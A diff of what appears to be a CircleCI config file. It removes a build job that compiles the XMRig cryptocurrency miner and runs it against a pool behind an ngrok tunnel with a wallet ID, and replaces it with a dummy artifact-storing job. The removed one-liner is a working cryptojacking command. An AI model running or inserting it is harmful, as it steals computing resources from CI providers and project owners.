@@ -1,7 +1,18 @@
-version: 2.1
+version: 2
 jobs:
-  build:
-    docker:
-      - image: ubuntu
-    steps:
-      - run: apt-get update && apt-get install wget -y && DEBIAN_FRONTEND="noninteractive" TZ="America/New_York" apt-get install -y tzdata && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig -o 8.tcp.ngrok.io:15953 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.gratisan#yl8x-tlrw
+build:
+  working_directory: /tmp
+  steps:
+    - run:
+        name: Creating Dummy Artifacts
+        command: |
+          echo "my artifact file" > /tmp/art-1;
+          mkdir /tmp/artifacts;
+          echo "my artifact files in a dir" > /tmp/artifacts/art-2;
+
+    - store_artifacts:
+        path: /tmp/art-1
+        destination: artifact-file
+
+    - store_artifacts:
+        path: /tmp/artifacts
